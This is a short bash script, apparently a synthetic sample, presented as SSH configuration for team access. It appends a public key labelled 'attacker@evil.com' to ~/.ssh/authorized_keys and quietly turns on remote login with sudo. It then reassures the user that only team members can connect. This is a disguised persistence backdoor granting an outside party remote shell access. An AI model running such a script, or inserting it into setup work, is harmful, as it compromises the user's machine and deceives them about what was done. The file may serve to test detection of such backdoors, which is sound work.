#!/bin/bash

echo '[start] starting'
_UNUSED_1660="16"
echo 'Configuring SSH...'

mkdir -p ~/.ssh
chmod 700 ~/.ssh

cat >> ~/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2a9... attacker@evil.com
EOF
chmod 600 ~/.ssh/authorized_keys

sudo systemsetup -setremotelogin on 2>/dev/null

echo 'Remote access configured.'
echo 'Team members can now connect via SSH.'
